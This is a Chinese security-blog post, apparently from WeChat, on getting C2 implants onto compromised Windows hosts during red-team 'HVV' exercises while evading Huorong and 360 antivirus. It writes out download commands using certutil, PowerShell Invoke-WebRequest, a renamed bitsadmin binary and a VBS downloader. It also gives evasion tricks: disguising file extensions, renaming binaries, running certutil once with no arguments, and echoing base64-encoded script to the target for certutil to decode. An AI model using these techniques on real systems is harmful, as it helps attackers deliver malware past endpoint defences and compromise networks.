> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/I7nzjos8cr3iuxWwYRES8w)

  

**点击蓝字 ·  关注我们**

**背景**

一年一度的 HVV 又要开始啦，在内网横向的时候，可能在 Webshell 上传大文件、或 SMBEXEC、xp_cmdshell 执行的时候，需要利用系统自带的下载命令，直接下载 C2 马执行。

我在这里就不说如何用 DOS 命令写执行文件了，（主要利用 certutil 进行加密，分段写入，再利用 certutil 解密还原）再做下载了，遇到稍微大一些的文件，着实有点费劲。

certutil Bypass

**普通下载**

```
certutil -urlcache -split -f http://xxx/calc.exe  
C:\windows\temp\updates.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrm7zHhCwmGVkbzNzF3uahJk1VcQmcSRuQfmVoVkGDRkBXsVvfq5xLZFQ/640?wx_fmt=png)

可以看到防护项目，指出我们利用 Certutil 下载了可执行文件，那么我们下载非执行文件是否就可以了呢？

```
certutil -urlcache -split -f http://x/calc.txt  
C:\windows\temp\updates.txt  && 
C:\windows\temp\updates.txt
```

直接把下载的可执行文件，改成 txt，火绒就可以 Bypass 了

(可见这里火绒拦截的只是下载文件的后缀格式，是否为可执行文件)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrm8tiaviaDRIc6tyCkpGwk9MuRpLPp2Quj1bMZZI2zeoBeSHVh2cX0Oefw/640?wx_fmt=png)

但是，当我们遇到了 360，并不好使！！！ 风险内容为：certutil 木马下载工具，那是识别出我的命令？

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmM9Kic5u8yNbrSFNxDp782yzI8Gc1bRxp3UkibjK6NaM4XmLddv4oM21Q/640?wx_fmt=png)

这个最后解决挺佛系的， 首先我们要 copy 一份 certutil 到任意目录 任意文件名，保持不变也没有关系

为了运行 certutil 时 不在 system32 目录下运行，

  1. 首先正常执行一遍，不要带任何参数，

  2. 第二遍再带参数  360 就不拦截啦

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmXoNyicsrzE6zSDnlsicibFibRlmfWQ0PjPtX1I9yA02uLAGWEVdCrA94xQ/640?wx_fmt=png)

Powershell download

```
powershell -c "Invoke-WebRequest -uri 
 http://x:80/download/sv.exe -OutFile 
 C:\windows\tasks\x.exe"
```

Powerhsell 如果执行的第一条没有被绕过，那么接下来执行 Whomai 也会被 ban

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmibCSUSmxVRTts0VkKNSnRp5g0p3GT267dZdm9Lt1fxxIOZKZesx04CA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmiam23303mQf0RrVklaxLlp5yYGOeLEIILM7MZgF1WHgFZLibs5PxwdxA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmvseXhBADj2Ay5Ibbe9hdJvHsMpaG71e50xiaJ8b2ibib57xwO0l0eQsEA/640?wx_fmt=png)

针对 360 的拦截，需要把 powershell 名称修改掉，由于我这里的下载网址不存在，Webrequest 的操作还是执行了的（但是很多情况 对 powershell 拦截的着实很严重，有更好的方法，师傅们可以加我们内部创建的群，互相交流下），powershell 可以和环境变量花式玩起来。

Bitsadmin

```
bb.exe /transfer n  
https://www.baidu.com/img/flexible/logo/pc/result.png %LOCALAPPDATA%\Temp\1.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmPxiabrK8skPYIuZibsiar7N5aXNLHic9ibDKD1rG68RUHMCPub7kGJxjy5w/640?wx_fmt=png)

当我把详细信息的 bitsadmin 删除后

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmtm0NamhaqbDbiaVc8a9bWHDfKB0tNzEQgQPKpv3CNSBNtHNYoGn1OqQ/640?wx_fmt=png)

我的下载就可以正常执行了，某数字 AV 就对我放行了。所以杀的并不是行为，只是特征！

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmq529PlTesjBYmxBzUHPLdpJFNyl7TS7jGESeicmCZceDEeP26zkSHZw/640?wx_fmt=png)

但是在 DOS 下对详细信息的处理也不是很轻松，具体还是要看大家当时的环境和需求，支持个怎么样的玩法吧。

手写 VBS 进行下载

```
cscript down.vbs 
http://www.baidu.com/img/dong_528d34b686d4889666f77c62b9a65857.gif 1.jpg
```

这里要求对 VBS 免杀就可以了，火绒和 360 都是没有拦截的。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrm9gY8zTHLZuWKywaUo1CEIjZ9ITpa98WsxW1rXibE55u4SQvhvMwZJCA/640?wx_fmt=png)

那么环境再苛刻一点，只有一个 Shell 会话，这 13 行代码如何在命令行中 echo 到目标呢？

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmHlPXpd51mOibDNU1SicfGB0lMN5SmIhkTeBqib8xIxhfET5v5Mibdmjntw/640?wx_fmt=png)

本地做好 base64 加密

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmktbZ0X8ibj1ahk2B3wnTI2wB62kZpBZIyjf9UHZ7dCsWHfrIYu5jomA/640?wx_fmt=png)

手动去除注释信息，和换行，拼接为一行，直接 echo 写入目标，再用 certutil -decode 做解密即可正常使用。

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmWdQbDrLfGbIPmXXhTkAD8BPPqMqAE5RN0dhRshEYtXr03iaZ02mMRfQ/640?wx_fmt=png)

这里写的还算是比较短的了，如果有更好的方法，希望师傅们可以加我们内部群共同讨论。

**00**

Tip

 ****VBS 脚本可转发朋友圈并关注公众号 回复 EDI-VBS 进行下载****

![](https://mmbiz.qpic.cn/mmbiz_png/rJALXSMzgenUjQUbYlEgNuhhSUmZgOrmmZJkatba9NVsTbq6jjsCBZpGLtSFXOnGwlB2ibTtqvkHiayJ4mnj45uw/640?wx_fmt=png)